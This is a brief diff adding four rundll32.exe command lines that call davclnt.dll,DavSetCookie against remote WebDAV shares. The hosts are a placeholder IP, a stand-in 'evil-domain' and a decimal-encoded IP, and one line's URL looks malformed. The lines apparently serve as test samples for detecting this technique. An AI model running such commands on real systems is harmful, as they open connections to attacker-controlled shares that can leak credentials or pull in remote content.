@@ -1,0 +1,4 @@
+rundll32.exe "davclnt.dll",DavSetCookie http://203.0.113.5/share
+rundll32.exe davclnt.dll,DavSetCookie httevil-domain.com/share
+rundll32.exe davclnt.dll,DavSetCookie http://203.0.113.5/share
+rundll32.exe davclnt.dll,DavSetCookie http://3405803781/share
